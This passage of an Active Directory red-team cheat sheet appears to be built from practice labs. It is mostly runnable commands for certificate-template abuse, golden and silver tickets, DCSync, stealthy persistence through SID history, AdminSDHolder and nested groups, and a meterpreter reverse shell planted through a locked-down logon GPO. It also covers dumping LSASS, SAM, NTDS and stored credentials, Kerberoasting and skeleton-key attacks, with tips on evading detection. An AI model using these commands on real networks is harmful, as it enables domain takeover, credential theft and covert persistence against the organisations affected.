  2. Select **Group Policy Management** snap-in and click **Add**, then **Ok**.
  3. Navigate to the appropriate GPO (Servers > Management Servers > Management Server Pushes).
  4. Right-click the GPO and select **Edit** to open the Group Policy Management Editor.
  
- **To add your account to local groups:**
  1. Expand **Computer Configuration** -> **Policies** -> **Windows Settings** -> **Security Settings**.
  2. Right-click **Restricted Groups** and select **Add Group**.
  3. Click **Browse**, enter **IT Support** and click **Check Names**, then **Ok** twice.
  4. For the second filter, add **Administrators** and **Remote Desktop Users** groups.
  5. Apply the changes. The GPO will be applied within 15 minutes, granting administrative and RDP permissions on the target server.

## Bloodhound Extra Queries
- **Useful Bloodhound Resources:**
Supply data to BloodHound:
`. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1`
`Invoke-BloodHound -CollectionMethod All`
`.\SharpHound.exe --CollectionMethods All --Domain za.NAI.com --ExcludeDCs` Collect all but do not touch domain controllers- Theoretically evasive
`neo4j console` Start neo4j
`bloodhound`

- [Pentest Everything Guide](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/tools/bloodhound)
- [Hausec’s Bloodhound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
- [ZephrFish's Bloodhound Custom Queries](https://github.com/ZephrFish/Bloodhound-CustomQueries)
- [Hausec's Bloodhound Custom Queries](https://github.com/hausec/Bloodhound-Custom-Queries)

## Finding Vulnerable Certificate Templates
`certutil -Template -v > templates.txt`*This will provide output on all configured templates.*

Explore tools for assistance:
- [Certify](https://github.com/GhostPack/Certify)
- [ForgeCert](https://github.com/GhostPack/ForgeCert)
- [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit)

- **(Some) Vulnerable Template Characteristics:** 
- Client Authentication capability
- CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT for SAN specification
- CTPRIVATEKEY_FLAG_EXPORTABLE_KEY for exportable certificates
- Adequate permissions for certificate template usage

- **Enumerate (and for other attacks) AD CS in the target forest:**
  `Certify.exe cas`

- **Enumerate the templates:**
  `Certify.exe find`

- **Enumerate vulnerable templates (This only checks if domain users have enrollment rights on any template) The attack surface is huge so don't trust this:**
  `Certify.exe find /vulnerable`

- **The template "SmartCardEnrollment-Agent" allows Domain users to enroll and has "Certificate Request Agent" EKU.**
  `Certify.exe find /vulnerable`

- **The template "SmartCardEnrollment-Users" has an Application Policy Issuance Requirement of Certificate Request Agent and has an EKU that allows for domain authentication. Search for domain authentication EKU:**
  `Certify.exe find /json /outfile:C:\AD\Tools\file.json ((Get-Content C:\AD\Tools\file.json | ConvertFrom-Json).CertificateTemplates | ? {$_.ExtendedKeyUsage -contains "1.3.6.1.5.5.7.3.2"}) | fl *`

- **Escalation to DA, We can now request a certificate for Certificate Request Agent from "SmartCardEnrollment-Agent" template.**
  `Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA/template:SmartCardEnrollment-Agent`

- **Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of DA using the "SmartCardEnrollment-Users" template.**
  `Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123`

- **Convert from cert.pem to pfx (esc3user-DA.pfx below), request DA TGT and inject it:**
  `Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt`

- **Escalation to EA, Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of EA using the "SmartCardEnrollment-Users" template.**
  `Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123`

- **Request EA TGT and inject it:**
  `Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt`

- **The CA in moneycorp has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set. This means that we can request a certificate for ANY user from a template that allows enrollment for normal/low-privileged users.**
  `Certify.exe find`

- **The template "CA-Integration" grants enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx**
  `Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altname:administrator`

- **Convert from cert.pem to pfx (esc6.pfx below) and use it to request a TGT for DA (or EA).**
  `Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:SecretPass@123 /ptt`

- **The template "HTTPSCertificates" has ENROLLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag. (So we can access put the subject we want, so we can access cert on behalf of whoever we want)**
  `Certify.exe find /enrolleeSuppliesSubject`

- **The template "HTTPSCertificates" allows enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx**
  `Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator`

- **Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or EA).**
  `Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt`

- **Setup MMC for GPO Editing:** 
Open MMC: `C:\>mmc`
- Navigate: File -> Add/Remove Snap-in -> Group Policy Management
- Add Certificates snap-in for Computer Account on Local computer

- **Request and Configure Certificate:** 
- Right-click Personal -> All Tasks -> Request New Certificate
- Provide Common Name, add User principal name (UPN) for DA account (e.g., Administrator@za.NAI.loc)

- **Export Certificate with Private Key:** 
- Right-click on the certificate -> All Tasks -> Export...
- Select "Yes, export the private key", set a password, and choose a save location

- **User Impersonation through a Certificate**

- **Obtain TGT with Rubeus:** 
`\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:NAI /outfile:administrator.kirbi /domain:za.NAI.loc /dc:12.31.1.101`

- **Use the Ticket for Access:** 
```
mimikatz # privilege::debug
mimikatz # kerberos::ptt administrator.kirbi
mimikatz # exit
dir \OXIDC.za.NAI.loc\c$\
```

- **Golden Ticket with Mimikatz**

- **Essentials for Golden Ticket Creation:** 
- Domain FQDN, SID, username, and KRBTGT hash

- **Retrieve KRBTGT Password Hash:** 
mimikatz # `privilege::debug`
mimikatz # `lsadump::dcsync /user:za\krbtgt`


## Cross Forest Trust Golden Ticket

- **Retrieve Domain Controller SIDs:** 
- Child DC: `Get-ADComputer -Identity "OXIDC"`
- Parent DC: `Get-ADGroup -Identity "Enterprise Admins" -Server OXIrootdc.NAI.loc`

- **Create and Use Golden Ticket:** 
```
mimikatz # privilege::debug
mimikatz # kerberos::golden /user:Administrator /domain:za.NAI.loc /sid:S-1-5-21-xxxxxx /service:krbtgt /rc4:<krbtgt hash> /sids:<Enterprise Admin SID> /ptt
mimikatz # exit
dir \OXIdc.za.NAI.loc\c$
dir \OXIrootdc.NAI.loc\c$\
```

## Persistence in AD
- **DC SYNC all** 
`mimikatz # log syncemup_dcdump.txt `
`mimikatz # lsadump::dcsync /domain:za.NAI.loc /all`*Get all username, hashes and etc*
- **DC SYNC Alrternative of mimi(remote ofc)**
`python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@MACHINE_IP`
0x36c8d26ec0df8b23ce63bcefa6e2d821

- **Forge tickets**
` Get-ADDomain` *Get the domain SID*
*All the other information can be found on a dc sync*

- **Golden ticket**
`mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.NAI.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt`

- **Silver ticket**
```         
mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.NAI.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```

- **Generating our own Certificates become CA and make them cry**
`mimikatz # crypto::certificates /systemstore:local_machine`
`mimikatz # privilege::debug`
`mimikatz # crypto::capi`
`mimikatz # crypto::cng`
`mimikatz # crypto::certificates /systemstore:local_machine /export`The exported certificates will be stored in both PFX and DER format to disk, The za-THMDC-CA.pfx certificate is the one we are particularly interested in. In order to export the private key, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.

`C:\Users\aaron.jones>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.NAI.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 `

    CaCertPath - The path to our exported CA certificate.
    CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
    Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
    SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
    NewCertPath - The path to where ForgeCert will store the generated certificate.
    NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.

`C:\Users\aaron.jones>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:NAI /outfile:administrator.kirbi /domain:za.NAI.loc /dc:10.200.x.101`*Get the TGT*

    /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
    /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algoriOXI is weak, which would result in an overpass-the-hash alert
    /certificate - Path to the certificate we have generated
    /password - The password for our certificate file
    /outfile - The file where our TGT will be output to
    /domain - The FQDN of the domain we are currently attacking
    /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running

`mimikatz # kerberos::ptt administrator.kirbi`
`mimikatz # exit`

- **SID Persistence(Domain adm privs)**

Since the SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group. Making this a very sneaky method of persistence. We have all the permissions we need to compromise the entire domain (perhaps the entire forest), but our account can simply be a normal user account with membership only to the Domain Users group. We can up the sneakiness to another level by always using this account to alter the SID history of another account, so the initial persistence vector is not as easily discovered and remedied.

`Get-ADUser <your ad username> -properties sidhistory,memberof`*Check the SID history of the account we want*
`Get-ADGroup "Domain Admins"` *get the SID of the Domain Admins group*

`Import-Module DSInternals`
`Stop-Service ntds -Force`
`Add-ADDBSidHistory -SamAccountName 'donald.ross' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath 'C:\Windows\NTDS\ntds.dit'`
`Start-Service ntds`

- **Nested group persistence**
For instance, we have an alert that fires off when a new member is added to the Domain Admins group. That is a good alert to have, but it won't fire off if a user is added to a subgroup within the Domain Admins group. We would make use of the existing groups to perform nesting instead of creating them as we will do below. However, this is something you would never do on a normal red team assessment !!

`New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security` *creating a new base group that we will hide in the People->IT Organisational Unit (OU)*

`New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security`

`Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"`*Let's now create another group in the People->Sales OU and add our previous group as a member:*

`Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup2"` *add that group to the Domain Admins group:*

`Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"`*add our low-privileged AD user to the first group we created*

## Persisting through AD Group Templates

## Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
`Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`

## Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder (Go for what you exactly need and not the full permissions):
`Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`

`Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`

## Using ActiveDirectory Module and RACE toolkit (https://github.com/samratashok/RACE):
`Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose`

## Check (if what we did before worked or not) the Domain Admins permission - PowerView as normal user:
`Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}`

## Using ActiveDirectory Module:
`(Get-Acl -Path 'AD:\CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}`

## Moreover now we can abuse: Abusing FullControl using PowerView:
`Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose`

## Using ActiveDirectory Module:
`Add-ADGroupMember -Identity 'Domain Admins' -Members testda`

## Abusing ResetPassword using PowerView:
`Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`

## Using ActiveDirectory Module:
`Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`

- **More Persistence through AD Group Templates**
Inject into the templates that generate the default groups. By injecting into these templates, even if they remove our membership, we just need to wait until the template refreshes, and we will once again be granted membership.

To avoid kicking users out of their RDP sessions, it will be best to RDP into THMWRK1 using your low privileged credentials, use the runas command to inject the Administrator credentials, and then execute MMC from this new terminal:

`runas /netonly /user:OXIchilddc.NAI.loc\Administrator cmd.exe`

*Once you have an MMC window, add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Computers). Make sure to enable Advanced Features (View->Advanced Features). We can find the AdminSDHolder group under Domain->System:*

*Navigate to the Security of the group (Right-click->Properties->Security):*
*Let's add our low-privileged user and grant Full Control:
    Click Add.
    Search for your low-privileged username and click Check Names.
    Click OK.
    Click Allow on Full Control.
    Click Apply.
    Click OK.*

- **GPO almost impossible to kick me out**
*Create a GPO that is linked to the Admins OU, which will allow us to get a shell on a host every time one of them authenticates to a host.*

`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe`

*Create the following script .bat*
`copy \\za.NAI.loc\sysvol\za.NAI.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe`


`scp am0_shell.exe za\\Administrator@OXIdc.za.NAI.loc:C:/Windows/SYSVOL/sysvol/za.NAI.loc/scripts/`
`scp am0_script.bat za\\Administrator@OXIdc.za.NAI.loc:C:/Windows/SYSVOL/sysvol/za.NAI.loc/scripts/` *SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:*

`msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"`*listener*

You will need to RDP into THMWRK1 and use a runas window running as the Administrator for the next steps.

- **GPO Creation**

The first step uses our Domain Admin account to open the Group Policy Management snap-in:

    In your runas-spawned terminal, type MMC and press enter.
    Click on File->Add/Remove Snap-in...
    Select the Group Policy Management snap-in and click Add
    Click OK

We will write a GPO that will be applied to all Admins, so right-click on the Admins OU and select Create a GPO in this domain, and Link it here. Give your GPO a name such as username - persisting GPO:

Right-click on your policy and select Enforced. This will ensure that your policy will apply, even if there is a conflicting policy. This can help to ensure our GPO takes precedence, even if the blue team has written a policy that will remove our changes. Now you can right-click on your policy and select edit:

Let's get back to our Group Policy Management Editor:

    Under User Configuration, expand Policies->Windows Settings.
    Select Scripts (Logon/Logoff).
    Right-click on Logon->Properties
    Select the Scripts tab.
    Click Add->Browse.

Let's navigate to where we stored our Batch and binary files, Select your Batch file as the script and click Open and OK. Click Apply and OK.

Go back to your MMC windows, click on your policy and then click on Delegation:

By default, all administrators have the ability to edit GPOs. Let's remove these permissions:

    Right-Click on ENTERPRISE DOMAIN CONTROLLERS and select Edit settings, delete, modify security.
    Click on all other groups (except Authenticated Users) and click Remove.

Click on Advanced and remove the Created Owner from the permissions:

We could replace Authenticated Users with Domain Computers to ensure that computers can still read and apply the policy, but prevent any user from reading the policy.

    Click Add.
    Type Domain Computers, click Check Names and then OK.
    Select Read permissions and click OK.
    Click on Authenticated Users and click Remove.

Right after you perform these steps, you will get an error that you can no longer read your own policy:


## Credential harvesting

- **Dump local hashes, one way**
- `Check powershell console history for credentials`
- **Dump local hashes, one way**
*cmd.exe prompt with administrator privileges*
`wmic shadowcopy call create Volume='C:\'`*wmic command to create a copy shadow of C: drive*
`vssadmin list shadows`*Listing the Available Shadow Volumes*
`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam`
`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system` *Copying the SAM and SYSTEM file from the Shadow Volume*
`python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam -system /tmp/system LOCAL`*Check the hashes* 

- **The other way**
`reg save HKLM\sam C:\users\Administrator\Desktop\sam`
`reg save HKLM\system C:\users\Administrator\Desktop\system`*Registry dump those*
`python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam -system /tmp/system LOCAL`

- **Protected LSASS dump**
`mimikatz # privilege::debug`
`mimikatz # !+`*Loading the mimidrv Driver into Memory*
`!processprotect /process:lsass.exe /remove`*Removing the LSA Protection*
`mimikatz # sekurlsa::logonpasswords`*Dump*
# Note that above would be very noisy in logs - Service installation (Kernel mode driver)

- **Dumping credentials manager**
`mimikatz # privilege::debug`
`mimikatz # sekurlsa::credman`
`mimikatz # vault::cred /patch`

- **Dump Credential Manager**
(https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)
`C:\Users\Administrator>vaultcmd /list`
`C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"`
`powershell -ex bypass`
`Import-Module C:\Tools\Get-WebCredentials.ps1`
`Get-WebCredentials`

- **Windows cred dump**
`C:\Users\OXI>cmdkey /list`*Enumerating for Stored Windows Credentials*
`runas /savecred /user:THM.red\OXI-local cmd.exe`*Run CMD.exe As a User with the /savecred argument*
THM{Runa5S4veCr3ds}

- **NTDS dump from the domain controller(local adm rights)**
`powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`*Dumping the content of the NTDS file*
*And then take them from the c:\temp and transfer them to your machine*
`python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local`

- **Checking LAPS( local account cred)**
`dir "C:\Program Files\LAPS\CSE"`
`Find-AdmPwdExtendedRights -Identity *`*Finding Users with AdmPwdExtendedRights Attribute*
`net groups "THMGroupReader"`*Finding Users belong to THMGroupReader Group, find a way to compromise him/her*
`Get-AdmPwdPassword -ComputerName creds-harvestin` *Getting LAPS Password with the Right User*



## Kerberoasting:
Find user accounts used as Service accounts there is no need that this service is actually running a service on a machine, if it has the SPN property populated it is a service acc(as a domain user you can request any tgs without having special privileges)
- **ActiveDirectory module**
`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
- **PowerView**
`Get-DomainUser–SPN`

- **Use Rubeus to list Kerberoast stats**
`Rubeus.exe kerberoast /stats`
- **Use Rubeus to request a TGS**
`Rubeus.exe kerberoast /user:svcadmin /simple`
- **To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of ATA - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC**
`Rubeus.exe kerberoast /stats /rc4opsec` (Recommended one)
`Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec`
- **Kerberoast all possible accounts**
`Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt`

- **Kerberoasting - AS-REPs  you might face that in cases of Oracle,products,workstations that are not windows,or some vpn staff) Enumerating accounts with Kerberos Preauth disabled (https://github.com/HarmJ0y/ASREPRoast)**
- **Using PowerView:**
`Get-DomainUser -PreauthNotRequired -Verbose`
- **Using ActiveDirectory module:**
`Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
- **If our user has permissions to Force disable Kerberos Preauth maybe on another user group we can do that: Let's enumerate the permissions for RDPUsers on ACLs using PowerView and disable pre-auth on Controlusers:**
`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}` 
`Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose`
`Get-DomainUser -PreauthNotRequired -Verbose`

- **Request encrypted AS-REP for offline brute-force. Let's use ASREPRoast**
`Get-ASREPHash -UserName VPN1user -Verbose`
- **To enumerate all users with Kerberos preauth disabled and request a hash**
`Invoke-ASREPRoast -Verbose`
- **We can use John The Ripper to brute-force the hashes offline**
`john.exe --wordlist=C:\\AD\\Tools\\kerberoast\\10k-worst-pass.txt C:\\AD\\Tools\\asrephashes.txt`

- **You can request TGS for every account SPN not set to null With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the forest and should be like "random/whoami1" random would be the service name and whoami1 would be the FQDN of the target server) We can then request a TGS without special privileges. The TGS can then be "Kerberoasted"**

- **Let's enumerate the permissions for RDPUsers on ACLs using PowerView (dev):**
`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
- **Using Powerview (dev), see if the user already has a SPN:**
`Get-DomainUser -Identity supportuser | select serviceprincipalname`
- **Using ActiveDirectory module:**
`Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName`

- **Set a SPN for the user (as said above)**
`Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}`
- **Using ActiveDirectory module:**
`Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'}`

- **Kerberoast the user**
`Rubeus.exe kerberoast /outfile:targetedhashes.txt`

- **Kerberoasting with impacket**
`python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/OXI` *Enumerating for SPN Accounts*
`python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/OXI -request-user svc-user` *Requesting a TGS Ticket as SPN Account*

- **AS-REP Roasting**
`python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP OXI.red/ -usersfile /tmp/users.txt` *Performing an AS-REP Roasting Attack against Users List*

- **When running Commands for finding local admin rights on other machines is also noisy.**
- **Find all machines on the current domain where the current user has local admin access (also Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1)**
`Find-LocalAdminAccess–Verbose`
- **Find computers where a domain admin (or specified user/group) has sessions:**
`Find-DomainUserLocation -Verbose`
`Find-DomainUserLocation -UserGroupIdentity "RDPUsers"`

- **Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess).**
`Find-DomainUserLocation -CheckAccess`

- **Skeleton Key (too much noise for nothing) Use the below command to inject a skeleton key (password would be mimikatz, want to change that change mimi source code and put ur own) on a Domain Controller of choice. DA privileges required**
`Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
- **Now, it is possible to access any machine with a valid username and password as "mimikatz"**
`Enter-PSSession–Computername dcorp-dc–credential dcorp\\Administrator`

- **There is a local administrator on every DC called DSRM "Administrator" whose password is the DSRM password. DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed. Dump DSRM password (needs DA privs)**
`Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc`
- **Compare the Administrator hash with the Administrator hash of below command**
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc`
- ** But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash**
`Enter-PSSession -Computername dcorp-dc`
`New-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD` (WHAT ARE YOU DOING you are making a user not allowed to logon remote to do so, you are not supposed to introduce extra vulns, stop it get some help !)

## PASS THE HASH/OVERPASS THE HASH AND ETC MIMIKATZ

- **Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation(Run as administrator)**
`Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'`

`SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"`
- **The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).**

- **Below doesn't need elevation ( This overwrites the current tickets)**
`Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt`
- **Below command needs elevation ( This starts a new process and if you run whoami you will not see ur impersonated admin privs. Because the proccess starts with logon type 9 so new credentials are used when you access network resources !)**
`Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`

- **To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:**
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'`
`SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"`

- **Execute mimikatz on DC as DA to get krbtgt hash**
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"'–Computername dcorp-dc`

# Golden ticket :
`Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"`
- **Explanation : name of the module, Username for which the TGT is generated (use an active domain admin with high logon count), Domain FQDN, SID of the domain, NTLM (RC4) hash of the krbtgt account or Use /aes128 and /aes256 for using AES keys which is MORE SILENT, Optional User RID (default 500) and Group default 513 512 520 518 519), Injects the ticket in current PowerShell process - no need to save the ticket on disk(Stealthier due the time validation time taken to validate the TGT), Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future, Optional ticket lifetime (default is 10 years) in minutes.The default AD setting is 10 hours = 600 minutes, Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800**

- **Silver ticket (Similar command can be used for any other service on a machine.Which services? HOST, RPCSS, HTTP and many more):**
`Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'` 
- **The only diff with the command above is this : /target:dcorp-dc.dollarcorp.moneycorp.local Target server FQDN, /service:cifs The SPN name of service for which TGS is to be created)**

- **Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server. Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages. All local logons on the DC are logged to C:\Windows\system32\kiwissp.log**
`$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages`


## Permission Delegation


Permission Delegation (ACE's)
https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#

- ForceChangePassword: Ability to set a user's current password without knowing their current password.
- AddMembers: Ability to add users, groups, or computers to the target group.
- GenericAll: Complete control over the object, including changing passwords, registering SPNs, or adding AD objects to a group.
- GenericWrite: Update any non-protected parameters of a target object, potentially updating scriptPath for script execution at user logon.
- WriteOwner: Update the owner of the target object to gain additional permissions.
- WriteDACL: Write new ACEs to the target object's DACL, possibly granting full control over the object.
- AllExtendedRights: Perform any action with extended AD rights against the target object, such as force changing a user's password.

- **AD-RSAT for permission delegation**
- **Add-ADGroupMember**
```powershell
$user = Get-ADUser -Identity 'user.name'
$group = Get-ADGroup -Identity 'IT Support'
Add-ADGroupMember -Identity $group -Members $user
Get-ADGroupMember -Identity $group
```
- **Check the members of a group**
`Get-ADGroupMember -Identity "IT Support"`
- **Pick a random T2 account to target**
`$t2admin = Get-ADGroupMember -Identity 'Tier 2 Admins' | Get-Random -Count 1`
- **Change the password**
`$password = 'strong.pass1' | ConvertTo-SecureString -AsPlainText -Force`
`Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $password`
`gpupdate /force`



## Kerberos UNCONSTRAINED DELEGATION

- **Enumeration for delegation (AD-RSAT)**
`Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description`

- **Powerview find for delegations**
